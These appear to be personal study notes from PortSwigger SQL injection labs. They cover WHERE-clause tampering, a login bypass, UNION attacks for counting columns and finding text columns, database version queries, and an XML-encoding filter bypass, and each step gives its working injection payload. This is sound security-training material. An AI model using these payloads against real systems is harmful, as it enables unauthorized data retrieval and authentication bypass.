[PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection),
[SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data 
- When user selects a category: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` /filter?category=Clothing%2c+shoes+and+accessories
- Solve the lab to display one or more unreleased products: `SELECT * FROM products WHERE category = '' OR 1=1 --'`/filter?category='+OR+1=1--
  - `--` is a comment indicator in SQL. Rest of the query is interpreted as a comment following this (effectively removing it). In this case, `AND released = 1` is removed. This could've been done just using the '--' to see unreleased items, but if you wanted to see unreleased items from all categories, the OR 1=1 --' works, as it is either Gifts or 1=1 is true, and since 1=1 is always true, the query returns all items.
 
## SQL injection vulnerability allowing login bypass
- When user logs in, there is a reported SQL vulnerability. Potential attempts to try include:
  - `SELECT firstname FROM users where username='administrator' and password='admin'`
  - `SELECT firstname FROM users where username=''' and password='admin'`
  - `SELECT firstname FROM users where username='administrator' --' and password='admin'` - WINNER

## SQL injection UNION attack, determining the number of columns returned by the query
- UNION attacks - retrieve data from other tables within the database. UNION allows for execution of additional SELECT queries: `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
- Two requirements for UNION attacks:
  1. Individual queries must return the same number of columns (find out how many columns are being returned from the original query)
      - Inject a series of ORDER BY clauses and incrementing the specified column index until an error occurs. `' ORDER BY 1--`, `'ORDER BY 2--`, etc.
      - Inject a series of UNION SELECT payloads with different number of null values `' UNION SELECT NULL--`, `'UNION SELECT NULL,NULL--`, etc.
        - A NullPointerException makes this method ineffective. 
  2. The data types in each column must be compatible with the individual queries (find out which columns returned from the original query are of a suitable data type to hold the results from the injected query).
- In this lab, attempted `'+ORDER+BY+2--'` through 4 and noticed 4 returned an error. Determined there were three columns.
  - Verified 3 columns by also using `'+UNION+SELECT+NULL,NULL,NULL--'` (# of nulls has to match # of columns)
 
## SQL injection attack, querying the database type and version on Oracle
- You can identify the database type and version by injecting provider-specific queries:
  - Microsoft/MySQL: `SELECT @@version`
  - Oracle: `SELECT * FROM v$version`
  - PostgreSQL: `SELECT version()`
- For example, UNION attack with following input: `' UNION SELECT @@version--`
- **REMEMBER** - you need to determine the number of columns first before performing a UNION attack.
  - Performed `' ORDER BY 2--'` - determined 2 columns, as 3 returned an error (category='+ORDER+BY+2--')
- Once I determined 2 columns, I knew I needed to add an additional column to call for in my request: `' UNION SELECT banner,null FROM v&version--`
  - `' UNION SELECT banner,null FROM v$version--`
  - `' UNION SELECT version, null FROM v$instance--` did not work for this Oracle database. 

![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/cc5bd783-036f-4acc-9d71-c7452b4a7d63)

## SQL injection attack, querying the database type and version on MySQL and Microsoft
- Just like with Oracle, you need to figure out how many columns there are. Remember that comments are different - if you use `--` for MySQL, you must include a space after! `-- `
  - Determined number of columns by `' UNION SELECT NULL,NULL-- `, URL-encoded: `'+UNION+SELECT+NULL,NULL--+ ` (3 nulls returned an error)
      - Could also be done with `' ORDER BY 3 -- `
- The solution informs you to also determine the data returned by the column, which we will look at in the lab following this one.
- `'+UNION+SELECT+%40%40version,NULL--+` aka `' UNION SELECT @@version,null-- `

## SQL injection UNION attack, finding a column containing text
- Desired interesting data is often returned as a string, so you may need to find the one or more columns whose data type is compatible with strings. You can do this by probing columns:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
- If the column type is not compatible with string data, a database error will likely be caused. If no error, and the response contains additional content like injected string value, relevant column is suitable for retrieving string data. 

![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/0cf51a15-ea3c-4b91-bab5-9136bd1540ec)


## SQL injection with filter bypass via XML encoding
- Different formats, such as JSON or XML, may provide you ways to obfuscate attacks that are otherwise blocked [Link](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding)
  - Can use the bApp extension Hackvertor to assist with encoding/decoding. 
- For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT [W3 UTF-8 Link](https://www.w3schools.com/charsets/ref_utf_basic_latin.asp):

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>

*The x indicates Hex for UTF-8 HTML, I believe*
```
- As for the lab, originally tried the following (UNION SELECT * FROM user--), which returned 0 units. Need to figure out how many columns maybe?:
```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>8 &#x55;NION &#x53;ELECT &#42; &#x46;ROM users.tables&#x2D;&#x2D; </productId><storeId>2</storeId></stockCheck>
```
  - Changed it to UNION SELECT null - we see that it only likes to return one column at a time, so we have to concatenate. Both inputs were impacted here:
    
![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/57c4ece1-7ea1-45e4-9866-3cd178865088)
![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/9fa260e3-3ce6-47d4-bfbc-27d316a4bcdc)


